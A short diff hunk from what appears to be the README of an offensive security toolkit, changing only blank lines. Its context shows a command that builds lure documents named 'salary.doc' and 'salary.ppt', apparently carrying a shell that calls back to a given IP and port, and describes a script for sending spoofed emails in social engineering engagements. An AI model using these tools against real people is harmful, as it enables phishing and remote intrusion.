@@ -39,10 +39,10 @@ $  python injectShell.py -t all -o salary -ip 192.168.1.6 -port 1111
 - Generated: salary.doc
 - Generated: salary.ppt
 ```
-  
-  
- 
-  
+    
+     
+   
+    
 **sendEmail.py**  
 This script is useful in sending spoofed emails to some SMTP servers. This can be useful in social engineering engagements.    
   
